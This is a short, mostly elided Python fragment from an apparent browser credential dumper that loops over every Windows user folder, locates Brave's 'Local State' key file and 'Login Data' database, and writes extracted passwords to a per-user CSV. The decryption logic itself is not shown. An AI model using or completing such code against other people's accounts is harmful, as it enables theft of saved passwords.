...
def get_chrome_passwords(db_path, secret_key, user_folder):
    ...
    try:
        ...
        csv_file_path = f'{user_folder}_brave_passwords.csv'
...
if __name__ == "__main__":
    ...
    for user_directory in find_users_directory():
        local_state_path = os.path.join(user_directory, 'AppData', 'Local', 'Brave Software', 'Brave-Browser', 'User Data', 'Local State')
        login_data_path = os.path.join(user_directory, 'AppData', 'Local', 'Brave Software', 'Brave-Browser', 'User Data', 'Default', 'Login Data')
